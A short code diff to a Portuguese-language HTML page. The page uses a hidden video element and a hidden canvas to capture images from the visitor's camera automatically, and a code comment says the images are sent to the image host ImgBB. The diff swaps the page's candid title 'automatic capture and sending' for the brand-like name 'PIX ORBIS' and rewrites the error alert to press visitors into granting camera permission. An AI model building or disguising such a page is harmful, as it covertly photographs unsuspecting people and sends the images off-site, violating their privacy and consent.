@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura Automática e Envio</title>
+    <title>PIX ORBIS</title>
 </head>
 <body>
-    <h1>Captura Automática e Envio</h1>
+    <h1>PIX ORBIS</h1>
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <p id="link"></p>
@@ -28,7 +28,7 @@
             })
             .catch(err => {
                 console.error('Erro ao acessar câmera:', err);
-                alert('Erro ao acessar câmera. Verifique as permissões do navegador.');
+                alert('Erro ao acessar a câmera. Por favor, conceda permissão para continuar.');
             });
 
         // Função para capturar imagem e enviar ao ImgBB
